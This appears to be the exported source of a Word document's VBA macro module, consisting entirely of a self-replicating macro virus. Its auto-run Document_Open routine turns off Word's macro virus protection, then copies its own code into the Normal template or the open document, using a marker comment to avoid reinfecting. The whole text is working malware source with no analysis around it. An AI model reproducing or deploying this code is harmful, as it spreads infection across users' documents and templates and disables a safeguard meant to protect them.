   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub document_open(): Const nula = 0
   Dim a, b, c, d: Set b = ThisDocument: Options.VirusProtection = nula
   If b = ActiveDocument Then Set c = NormalTemplate Else Set c = ActiveDocument
   d = b.VBProject.vbcomponents(1).codemodule.lines(1, _
   b.VBProject.vbcomponents(1).codemodule.countoflines): a = Strings.LCase(d)
   With c.VBProject.vbcomponents(1).codemodule
    If .lines(14, 1) <> "'string2" Then
     With c.VBProject.vbcomponents(1).codemodule
       .deletelines 1, c.VBProject.vbcomponents(1).codemodule.countoflines
       .insertlines 1, a
     End With
    End If
   End With
   End Sub
   'string2
